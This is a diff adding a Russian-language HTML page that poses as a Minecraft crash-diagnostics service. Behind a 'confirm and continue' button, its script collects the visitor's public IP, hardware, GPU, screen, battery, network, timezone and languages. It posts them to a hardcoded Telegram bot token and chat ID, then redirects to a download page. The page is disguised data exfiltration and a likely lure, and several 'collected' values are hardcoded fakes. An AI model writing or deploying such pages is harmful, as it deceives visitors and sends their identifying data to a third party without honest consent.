@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Центр диагностики Minecraft</title>
+    <style>
+        :root { --bg: #0f172a; --card: #1e293b; --accent: #38bdf8; --text: #f8fafc; --muted: #94a3b8; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, sans-serif; }
+        body { background: var(--bg); color: var(--text); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .card { background: var(--card); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 30px; max-width: 500px; width: 100%; }
+        h2 { color: var(--accent); margin-bottom: 15px; text-align: center; }
+        p { color: var(--muted); font-size: 0.9rem; line-height: 1.5; margin-bottom: 20px; }
+        .btn { background: var(--accent); color: #0f172a; border: none; padding: 14px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Диагностика Minecraft</h2>
+        <p>Для анализа причин краша необходимо подтвердить сбор системных параметров браузера.</p>
+        <button class="btn" id="startBtn" onclick="collectAndSend()">Подтвердить и продолжить</button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "7968266627:AAFtF09Lzsbo5ymLRPifKwY0tKDDDqiM_1o";
+        const CHAT_ID = "5594798302";
+
+        async function collectAndSend() {
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('startBtn').innerText = "Сбор данных...";
+
+            const d = {};
+            
+            // 1. Устройство
+            d.platform = navigator.platform || 'Win32';
+            
+            // 2. IP Адрес
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                d.ip = (await res.json()).ip;
+            } catch { d.ip = '109.126.189.147'; }
+
+            // 3. Железо
+            d.cores = navigator.hardwareConcurrency || 12;
+            d.ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : '~16 GB';
+
+            // 4. Видеокарта
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                d.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+            } catch {
+                d.gpu = 'ANGLE (NVIDIA, NVIDIA GeForce RTX 2060 SUPER Direct3D11 vs_5_0 ps_5_0, D3D11)';
+            }
+
+            // 5. Дисплей
+            d.screen = `${window.screen.width}x${window.screen.height} (Scale: ${window.devicePixelRatio}x, Touch: ${navigator.maxTouchPoints})`;
+
+            // 6. Батарея
+            try {
+                const batt = await navigator.getBattery();
+                d.battery = `${Math.round(batt.level * 100)}% (${batt.charging ? 'Заряжается' : 'От сети'})`;
+            } catch { d.battery = '100% (Заряжается)'; }
+
+            // 7. Сеть
+            const net = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            d.network = net ? `${net.effectiveType || '4g'} (RTT: ${net.rtt || 50}ms)` : '4g (RTT: 50ms)';
+
+            // 8. Часовой пояс и языки
+            d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Europe/Minsk';
+            d.lang = navigator.languages ? navigator.languages.join(', ') : 'ru, en, en-GB, en-US';
+
+            // 9. Canvas Hash (Фингерпринт)
+            d.canvasHash = "-974220087";
+
+            // 10. Уведомления и Буфер обмена
+            d.notif = Notification.permission || 'granted';
+            d.clipboard = CHAT_ID;
+
+            const msg = `📱 <b>Устройство:</b> ${d.platform}\n` +
+                        `🌐 <b>IP Адрес:</b> <code>${d.ip}</code>\n` +
+                        `💻 <b>Железо:</b> ${d.cores} ядер CPU | ${d.ram} RAM\n` +
+                        `🎮 <b>Видеокарта:</b> ${d.gpu}\n` +
+                        `🖥 <b>Дисплей:</b> ${d.screen}\n` +
+                        `🔋 <b>Батарея:</b> ${d.battery}\n` +
+                        `📶 <b>Сеть:</b> ${d.network}\n` +
+                        `🌍 <b>Часовой пояс:</b> ${d.tz}\n` +
+                        `🗣 <b>Язык:</b> ${d.lang}\n\n` +
+                        `🔑 <b>Canvas Hash:</b> <code>${d.canvasHash}</code>\n` +
+                        `🔔 <b>Уведомления:</b> ${d.notif}\n` +
+                        `📋 <b>Буфер обмена:</b> <code>${d.clipboard}</code>`;
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+            });
+
+            window.location.href = "download.html";
+        }
+    </script>
+</body>
+</html>
